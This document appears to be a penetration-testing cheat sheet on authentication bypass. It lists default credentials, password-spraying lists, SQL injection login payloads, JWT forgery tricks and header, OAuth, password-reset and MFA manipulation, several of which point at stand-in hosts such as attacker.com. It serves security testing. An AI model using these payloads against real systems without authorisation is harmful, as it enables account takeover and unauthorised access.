# Authentication Bypass Testing Methodology

## Quick Reference

**Common Bypass Patterns:**
- Default credentials
- SQL injection in login
- JWT manipulation
- Session fixation
- Forced browsing
- Parameter manipulation

---

## Credential-Based Attacks

### Default Credentials

**Common combinations:**
```
admin:admin
admin:password
admin:123456
root:root
root:toor
test:test
guest:guest
user:user
administrator:administrator
```

**Application-specific defaults:**
- WordPress: Check if `wp-admin` accessible
- Tomcat: `tomcat:tomcat`, `admin:admin`
- Jenkins: No default, check for no authentication
- phpMyAdmin: `root:` (empty password)
- MongoDB: No authentication by default
- Redis: No authentication by default
- Elasticsearch: No authentication by default

### Password Spraying

Test common passwords against many accounts:
```
password
Password1
123456
company2024
Summer2024
Welcome1
```

### Username Enumeration

**Detection methods:**
- Different error messages for valid/invalid users
- Response time differences
- Account lockout behavior
- Password reset functionality
- Registration "email already exists"

---

## SQL Injection in Authentication

### Login Bypass Payloads

```sql
-- Username field
admin'--
admin'#
admin'/*
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*
') OR '1'='1'--
') OR ('1'='1'--
' OR 1=1--
' OR 1=1#
admin' OR '1'='1
admin')--

-- Password field
' OR '1'='1
anything' OR '1'='1'--
```

### Second-Order SQLi

1. Register with username: `admin'--`
2. Later queries may use unsanitized username

---

## JWT (JSON Web Token) Attacks

### JWT Structure
```
header.payload.signature
```

### Algorithm Confusion (alg:none)

Change algorithm to "none":
```json
{"alg":"none","typ":"JWT"}
```

Then remove signature:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### Algorithm Confusion (RS256 to HS256)

If server uses RS256 (asymmetric), try HS256 (symmetric) with public key:

```bash
# Get public key
# Change alg to HS256
# Sign with public key as HMAC secret
```

### JWT Secret Brute Force

Common weak secrets:
```
secret
password
123456
your-256-bit-secret
```

Tools: `jwt_tool`, `hashcat`

### JWT Claims Manipulation

**Without re-signing (if signature not verified):**
```json
{"user": "admin", "role": "admin"}
```

**kid (Key ID) injection:**
```json
{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}
```

### JKU/X5U Header Injection

Point to attacker-controlled key:
```json
{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
```

---

## Session Attacks

### Session Fixation

1. Attacker obtains session ID
2. Sends link with session ID to victim
3. Victim authenticates
4. Attacker uses same session ID

**Test:**
- Check if session ID changes after login
- Check if session ID accepted from URL/form

### Session Prediction

**Weak session IDs:**
- Sequential numbers
- Predictable patterns
- Insufficient entropy

**Tools:** Burp Sequencer

### Session in URL

Check if session ID exposed in:
- URL parameters
- Referrer header
- Logs

---

## Forced Browsing / Direct Access

### Admin Panel Access

```
/admin
/admin/
/administrator
/manager
/console
/dashboard
/control
/cpanel
/wp-admin
/phpmyadmin
```

### API Direct Access

```
/api/admin/users
/api/v1/admin
/internal/api/
/graphql (without auth)
```

### Backup/Debug Files

```
/config.php.bak
/config.php~
/.git/config
/.env
/debug
/trace
```

---

## Parameter Manipulation

### Privilege Escalation

```
# Change role
POST /api/user
{"username":"test","role":"admin"}

# Change user ID
GET /api/user/123  →  /api/user/1

# Boolean flags
admin=true
isAdmin=1
role=administrator
```

### HTTP Parameter Pollution

```
# Bypass validation with duplicate params
POST /login
username=admin&username=attacker&password=x
```

---

## OAuth/OpenID Vulnerabilities

### Open Redirect in OAuth

```
/oauth/authorize?redirect_uri=https://attacker.com
```

### Token Leakage

Check if tokens in:
- URL fragments
- Referrer headers
- Browser history

### State Parameter

Missing or weak state parameter allows CSRF

### Scope Manipulation

```
scope=read → scope=admin
```

---

## Multi-Factor Authentication Bypass

### Response Manipulation

```json
// Change response
{"success": false} → {"success": true}
{"mfa_required": true} → {"mfa_required": false}
```

### Direct Access After First Factor

Try accessing protected resources after password but before MFA

### Code Brute Force

If no rate limiting:
- 4-digit: 10,000 attempts
- 6-digit: 1,000,000 attempts

### Backup Codes

- Often weaker than OTP
- May be predictable
- May not be invalidated after use

### MFA Fatigue

Repeatedly send MFA prompts until user approves

---

## Password Reset Vulnerabilities

### Token Weaknesses

- Short/predictable tokens
- Token reuse allowed
- Token doesn't expire
- Token not invalidated after password change

### Host Header Injection

```
POST /forgot-password
Host: attacker.com

# Password reset link sent to: http://attacker.com/reset?token=xxx
```

### Email Parameter Manipulation

```
email=victim@target.com&email=attacker@evil.com
email=victim@target.com%0acc:attacker@evil.com
email=victim@target.com,attacker@evil.com
```

### IDOR in Reset

```
/reset?token=xxx&user_id=1 → /reset?token=xxx&user_id=2
```

---

## Remember Me / Persistent Login

### Token Analysis

- Is token predictable?
- Does it contain user info?
- Is it properly signed?

### Token Fixation

- Can attacker set remember-me cookie?

---

## Registration Vulnerabilities

### Email Validation Bypass

```
admin@target.com
admin@target.com.attacker.com
admin@target.com%00@attacker.com
admin+anything@target.com → admin@target.com
ADMIN@target.com
admin@target.com (with leading/trailing spaces)
```

### Username Restrictions

```
admin (space after)
 admin (space before)
admin%00
ADMIN
```

### Race Condition

Register same username simultaneously

---

## HTTP Header Manipulation

### X-Forwarded Headers

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### Custom Auth Headers

```
X-Custom-IP-Authorization: 127.0.0.1
X-Auth-Token: admin
X-User: admin
```

---

## API Key / Token Testing

### Common Locations

- Authorization header
- X-API-Key header
- Query parameter
- Cookie

### Weak Key Patterns

- Hardcoded keys in JS
- Default/example keys
- Predictable patterns

---

## Verification Checklist

1. **Test authentication mechanisms:**
   - [ ] Default credentials
   - [ ] SQL injection in login
   - [ ] Brute force protection

2. **Test session management:**
   - [ ] Session fixation
   - [ ] Session prediction
   - [ ] Session expiration

3. **Test authorization:**
   - [ ] Forced browsing
   - [ ] Parameter manipulation
   - [ ] IDOR

4. **Test JWT (if applicable):**
   - [ ] Algorithm confusion
   - [ ] Secret brute force
   - [ ] Claims manipulation

5. **Document evidence:**
   - [ ] Working bypass
   - [ ] Impact demonstration
   - [ ] Affected functionality
